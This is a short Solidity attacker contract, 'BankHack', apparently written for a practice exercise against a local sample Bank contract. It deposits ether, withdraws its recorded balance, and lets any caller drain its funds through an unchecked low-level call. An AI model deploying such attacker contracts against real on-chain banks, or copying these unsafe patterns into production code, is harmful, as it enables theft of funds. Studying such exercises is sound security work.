// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Bank } from "../src/Bank.sol";

contract BankHack {
    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }


    function hack() public {
        bank.withdraw(bank.balanceOf(address(this)));
    }

    function deposit() public payable {
        bank.deposit{value: msg.value} ();
    }

    function withdraw() public {
        payable(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable{

    }
}